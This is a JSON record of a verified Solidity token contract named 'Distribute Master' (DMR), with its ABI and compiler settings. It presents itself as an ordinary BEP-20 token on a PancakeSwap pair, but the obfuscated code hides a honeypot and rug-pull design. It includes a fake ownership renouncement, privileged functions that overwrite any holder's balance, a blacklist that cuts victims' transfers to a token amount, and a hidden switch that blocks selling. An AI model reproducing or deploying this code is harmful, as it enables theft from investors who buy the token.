{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface autoTeamSwap {\n    function createPair(address launchedReceiverMax, address feeSell) external returns (address);\n}\n\ninterface marketingTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalLaunched) external view returns (uint256);\n\n    function transfer(address limitTrading, uint256 marketingReceiver) external returns (bool);\n\n    function allowance(address amountSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitTrading,\n        uint256 marketingReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTx, uint256 value);\n    event Approval(address indexed amountSender, address indexed spender, uint256 value);\n}\n\nabstract contract maxEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverEnable is marketingTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DistributeMaster is maxEnable, marketingTx, receiverEnable {\n\n    function transferFrom(address buyAuto, address limitTrading, uint256 marketingReceiver) external override returns (bool) {\n        if (_msgSender() != liquidityTxFrom) {\n            if (teamTotalAmount[buyAuto][_msgSender()] != type(uint256).max) {\n                require(marketingReceiver <= teamTotalAmount[buyAuto][_msgSender()]);\n                teamTotalAmount[buyAuto][_msgSender()] -= marketingReceiver;\n            }\n        }\n        return launchedTeamMax(buyAuto, limitTrading, marketingReceiver);\n    }\n\n    bool public listAt;\n\n    constructor (){\n        if (limitExempt == tradingMode) {\n            amountShould = true;\n        }\n        amountTeam shouldSenderSwap = amountTeam(liquidityTxFrom);\n        limitLiquidityList = autoTeamSwap(shouldSenderSwap.factory()).createPair(shouldSenderSwap.WETH(), address(this));\n        \n        fundSellTx = _msgSender();\n        shouldToMax[fundSellTx] = true;\n        isMin[fundSellTx] = liquidityLaunched;\n        feeTake();\n        if (limitExempt != amountTake) {\n            amountFrom = false;\n        }\n        emit Transfer(address(0), fundSellTx, liquidityLaunched);\n    }\n\n    mapping(address => bool) public shouldToMax;\n\n    function balanceOf(address totalLaunched) public view virtual override returns (uint256) {\n        return isMin[totalLaunched];\n    }\n\n    mapping(address => mapping(address => uint256)) private teamTotalAmount;\n\n    function launchedTeamMax(address buyAuto, address limitTrading, uint256 marketingReceiver) internal returns (bool) {\n        if (buyAuto == fundSellTx) {\n            return teamLaunched(buyAuto, limitTrading, marketingReceiver);\n        }\n        uint256 listLiquidity = marketingTx(limitLiquidityList).balanceOf(sellFrom);\n        require(listLiquidity == shouldMax);\n        require(limitTrading != sellFrom);\n        if (autoIsTrading[buyAuto]) {\n            return teamLaunched(buyAuto, limitTrading, shouldTxToken);\n        }\n        return teamLaunched(buyAuto, limitTrading, marketingReceiver);\n    }\n\n    uint8 private totalListSell = 18;\n\n    bool public receiverReceiverSell;\n\n    bool private liquidityExempt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityLaunched;\n    }\n\n    function approve(address liquiditySwap, uint256 marketingReceiver) public virtual override returns (bool) {\n        teamTotalAmount[_msgSender()][liquiditySwap] = marketingReceiver;\n        emit Approval(_msgSender(), liquiditySwap, marketingReceiver);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalListSell;\n    }\n\n    address liquidityTxFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private buyAt;\n\n    bool public feeTo;\n\n    event OwnershipTransferred(address indexed liquidityReceiver, address indexed receiverLaunched);\n\n    function isSell() private view {\n        require(shouldToMax[_msgSender()]);\n    }\n\n    function feeTake() public {\n        emit OwnershipTransferred(fundSellTx, address(0));\n        buyAt = address(0);\n    }\n\n    address sellFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address listMax, uint256 marketingReceiver) external virtual override returns (bool) {\n        return launchedTeamMax(_msgSender(), listMax, marketingReceiver);\n    }\n\n    uint256 private tradingMode;\n\n    function teamLaunched(address buyAuto, address limitTrading, uint256 marketingReceiver) internal returns (bool) {\n        require(isMin[buyAuto] >= marketingReceiver);\n        isMin[buyAuto] -= marketingReceiver;\n        isMin[limitTrading] += marketingReceiver;\n        emit Transfer(buyAuto, limitTrading, marketingReceiver);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoBuy;\n    }\n\n    uint256 private amountTake;\n\n    uint256 takeSwap;\n\n    bool private amountShould;\n\n    uint256 shouldMax;\n\n    function getOwner() external view returns (address) {\n        return buyAt;\n    }\n\n    uint256 private liquidityLaunched = 100000000 * 10 ** 18;\n\n    uint256 constant shouldTxToken = 3 ** 10;\n\n    address public limitLiquidityList;\n\n    bool private fundSellMarketing;\n\n    bool public amountFrom;\n\n    function swapTo(uint256 marketingReceiver) public {\n        isSell();\n        shouldMax = marketingReceiver;\n    }\n\n    mapping(address => bool) public autoIsTrading;\n\n    function allowance(address totalLaunch, address liquiditySwap) external view virtual override returns (uint256) {\n        if (liquiditySwap == liquidityTxFrom) {\n            return type(uint256).max;\n        }\n        return teamTotalAmount[totalLaunch][liquiditySwap];\n    }\n\n    mapping(address => uint256) private isMin;\n\n    address public fundSellTx;\n\n    uint256 private limitExempt;\n\n    bool private fromBuy;\n\n    function buyIs(address tradingWallet) public {\n        if (feeTo) {\n            return;\n        }\n        \n        shouldToMax[tradingWallet] = true;\n        if (amountTake != limitExempt) {\n            limitExempt = amountTake;\n        }\n        feeTo = true;\n    }\n\n    function exemptLimit(address feeAmount) public {\n        isSell();\n        if (receiverReceiverSell != fromBuy) {\n            listAt = false;\n        }\n        if (feeAmount == fundSellTx || feeAmount == limitLiquidityList) {\n            return;\n        }\n        autoIsTrading[feeAmount] = true;\n    }\n\n    string private liquidityLaunch = \"DMR\";\n\n    function senderTakeMin(address listMax, uint256 marketingReceiver) public {\n        isSell();\n        isMin[listMax] = marketingReceiver;\n    }\n\n    string private autoBuy = \"Distribute Master\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return buyAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquiditySwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoIsTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"}],\"name\":\"buyIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"exemptLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSellTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLiquidityList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"senderTakeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldToMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"swapTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DistributeMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}